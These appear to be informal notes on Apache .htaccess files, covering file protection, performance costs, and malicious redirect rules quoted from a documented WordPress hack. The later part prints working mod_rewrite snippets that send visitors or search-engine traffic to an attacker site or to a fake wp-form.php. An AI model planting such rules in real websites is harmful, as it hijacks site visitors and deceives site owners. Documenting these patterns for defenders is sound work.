## background of htaccess
Htaccess allows you to make configuration changes on a directory for Apache HHTP Server. Redirect and mod_rewrite the URI 

It will not be visible under standard Apache setup which blocks all files starting with.ht from being served. So nobody will be able to view the contents or get at it through the Apache front-end. Take the usual precaution of having it be 644 permissions and not owned by the user that Apache runs as. No extra security needed outside of protecting your server generally.

Check that the standard protection is in place, so it can't be viewed. Easiest way is just to try visiting it in a web browser. You should get a 403 forbidden.
644 /444
If you're worried you could put the rules in the main server config instead. I wouldn't worry as long as the above is in place
#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
        Require all denied
</FilesMatch>

<files ~ "^.*.([Hh][Tt][Aa])">
order allow,deny
deny from all
satisfyall
</files>

Anything you can do with a .htaccess file you can do with the server main configuration file better!

If you have root access to your server, you can make changes in the httpd.conf file for Apache. This is much better than using the .htaccess file.

Why you should not use the .htaccess file.
The reason you should not use the .htaccess file is that it slows down every request. This performance hit is only increased when your server is under high load. Because the .htaccess file modifies the server configuration in a directory, it essentially forces the server to reconfigure when serving from that directory.

That takes time!

The server must execute the .htaccess file to use it. This means that the server will need to use extra RAM, CPU power, and computing time to process a .htaccess file. This means each request that runs through a .htaccess file will take more resources and time.

You may not think this is a huge problem. But, this problem compounds itself when you stack .htaccess files in directories and sub-directories.


Your website is built with WordPress. Your blog has a few pictures in each post. Let's say your root domain is located in the /public_html directory.

The following images are included in a blog post.

/public_html/wp-content/uploads/2017/06/image1.jpg
/public_html/wp-content/uploads/2017/06/image2.jpg
/public_html/wp-content/uploads/2017/06/image3.jpg
You also have an .htaccess file in /public_html and one in /wp-content.

This means that your server must execute the first .htaccess file. Then it must execute the second one. After that, it looks for a .htaccess file in /uploads, then in /2017, and finally in /06.

Let's say if the htaccess file is there.
How are we going to take over it from there.

https://make.wordpress.org/support/handbook/appendix/breakfix-lessons/hacked-htaccess-redirect/
The following snippit comes from a real hack. This code was found in the .htaccess files and checks for any traffic to be sent to the site and it automatically redirects to another site.

<IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteBase /
        RewriteCond %{HTTP_REFERER} ^http://[w.]*([^/]+)
        RewriteCond %{HTTP_HOST}/%1 !^[w.]*([^/]+)/\1$ [NC]
        RewriteRule ^.*$ http://EVILHACKERSITE.COM [L,R]
</IfModule>
This code is slightly more clever and only redirects html or xml pages. This is clever because it’s not something you’d actually notice unless you went to a html file (something WP sites rarely do).

<IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteRule ([^.]+\.(html|xml|))$ http://EVILHACKERSITE.COM [L,R]
</IfModule>
This one checks where you came from and if it was a search engine, redirects you.

RewriteEngine On
RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR]
RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
RewriteRule .* http://EVILHACKERSITE.COM/in.html?s=hg [R,L]
Errordocument 404 http://EVILHACKERSITE.COM/in.html?s=hg_err
Here’s another, that tries to blend the last two by detecting search engines or if you’re going to a named file extension (again, something most WordPress visitors never do) and redirect them.

<IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteCond %{HTTP_USER_AGENT} (google|msn|aol|bing) [NC,OR]
        RewriteCond %{HTTP_REFERER} (yahoo|google|aol|bing) [NC]
        RewriteCond %{REQUEST_URI} /$ [OR]
        RewriteCond %{REQUEST_FILENAME} (html|htm|shtm|shtml|php|php3|php4|php5)$ [NC]
        RewriteCond %{REQUEST_FILENAME} !wp-form\.php$
        RewriteRule ^.*?$ /wp-form.php [L]
</IfModule>

Where this one gets super sneaky is that it made a file called wp-form.php, which looks like but is not a real WordPress file. In that file was a series of checks and redirects which sent the visitor to another website. Where this particular hack failed is that the wp-admin pages usually end in .php, so the site admin noticed that he was being redirected when he tried to go to, say, example.com/wp-admin/plugins.php – Ooops.
